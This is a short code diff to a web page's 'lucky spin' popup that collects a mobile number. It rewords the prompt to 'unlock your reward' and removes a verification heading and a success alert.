@@ -7,8 +7,7 @@
                 <div class="w-12 h-12 bg-indigo-50 text-indigo-600 rounded-xl flex items-center justify-center mb-3">
                     <i class="fa-solid fa-shield-halved text-xl"></i>
                 </div>
-                <h2 class="text-lg font-bold text-gray-900">Verification Required</h2>
-                <p class="text-xs text-gray-500 mt-1">Please enter your mobile number to continue to the lucky spin.</p>
+                <p class="text-xs text-gray-500 mt-1">Please enter your mobile number to unlock your reward</p>
             </div>
 
             <div class="space-y-4">
@@ -80,14 +79,6 @@
                 .then(data => {
                     if (data.success) {
                         document.getElementById('spinPopup').classList.add('hidden');
-                        // Success feedback
-                        Swal.fire({
-                            icon: 'success',
-                            title: 'Verified',
-                            timer: 1000,
-                            showConfirmButton: false
-                        });
-                        // Aapka spin code yahan se start hoga
                     }
                 })
                 .catch(err => console.error("Database error:", err));
